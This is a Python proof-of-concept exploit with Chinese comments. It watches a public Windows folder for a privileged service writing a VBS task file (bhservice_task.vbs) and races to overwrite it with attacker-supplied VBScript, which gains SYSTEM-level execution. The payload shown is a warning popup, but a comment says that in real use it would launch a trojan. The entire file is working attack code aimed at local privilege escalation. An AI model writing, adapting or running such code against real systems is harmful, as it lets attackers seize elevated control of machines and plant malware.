import os
import sys
import time
import win32file
import win32con

# =====================================================================
# 配置区域 (必须与你的测试环境绝对匹配)
# =====================================================================
MONITOR_DIR = "C:\\Users\\Public\\Downloads\\python"       # 要监控的文件夹路径
TARGET_FILE = "bhservice_task.vbs"                  # 要狙击的目标文件名

# 黑客准备掉包进去的恶意 VBS 代码 (这里用弹窗测试，实战中会填入拉起木马的指令)
EVIL_VBS_CODE = '''Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Popup "【提权警告】: 你的 VBS 已经被木马在 1 毫秒内掉包并执行了！", 5, "SYSTEM 权限执行"
'''

def exploit_race_condition(file_path):
    """
    核心提权一击：在毫秒级时间内强行覆写文件
    """
    try:
        # 使用最高写入权限强行覆写目标文件
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(EVIL_VBS_CODE)
        print(f"\n[⚡ 绝杀成功] 成功在毫秒内触发条件竞争！文件 {TARGET_FILE} 已被恶意掉包。")
    except Exception as e:
        # 如果服务正好在读写，可能会发生文件锁冲突，这里会疯狂重试直到写入成功
        pass

def start_file_monitor():

    FILE_LIST_DIRECTORY = 0x0001 # 确保这一行在函数内或全局被定义

    print(f"[*] 毫秒级文件监控引擎已启动...")
    print(f"[*] 正在向 Windows 内核文件系统驱动注册底层通知...")
    print(f"[*] 正在死守目标目录: {MONITOR_DIR} -> 狙击目标: {TARGET_FILE}")
    print("-" * 75)

    # 1. 调用 CreateFileW 打开目录，获取该目录的专属内核句柄
    # 必须指定 FILE_LIST_DIRECTORY 权限才能监听目录
    h_dir = win32file.CreateFile(
        MONITOR_DIR,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS, # 必须加此参数才能打开目录句柄
        None
    )

    try:
        while True:
            # 2. 【核心原语】：调用 ReadDirectoryChangesW 阻塞等待内核事件
            # 只要这个目录下有任何风吹草动，Windows 内核会【瞬间】把通知砸给这个函数
            results = win32file.ReadDirectoryChangesW(
                h_dir,
                1024, # 缓冲区大小
                False, # 是否监控子目录
                # 关键：我们要监听文件的哪些动作？
                # FILE_NOTIFY_CHANGE_FILE_NAME (创建/删除) | FILE_NOTIFY_CHANGE_LAST_WRITE (修改)
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME | win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
                None,
                None
            )

            # 3. 解析内核返回的文件变动列表
            for action, file_name in results:
                full_path = os.path.join(MONITOR_DIR, file_name)
                
                # 4. 精准锁定：当发现动的文件正好是我们要狙击的 bhservice_task.vbs 时
                if file_name.lower() == TARGET_FILE.lower():
                    
                    # Action 1: 代表有人在这个目录下【创建】或【写入】了该文件
                    # 这正好对应了后台服务执行 shutil.copy 的那一刹那！
                    if action == 1 or action == 3:
                        print(f"\n[!] 警报！捕获到内核级动作 -> 发现高权限进程正在写入/创建 {TARGET_FILE} !!")
                        print("[*] 正在发起条件竞争对抗，强行截断并覆写...")
                        
                        # 瞬间执行覆盖动作（耗时通常小于 0.5 毫秒）
                        exploit_race_condition(full_path)

    except KeyboardInterrupt:
        print("\n[*] 文件监控器已安全停止。")
    finally:
        # 释放内核句柄
        win32file.CloseHandle(h_dir)

if __name__ == "__main__":
    start_file_monitor()
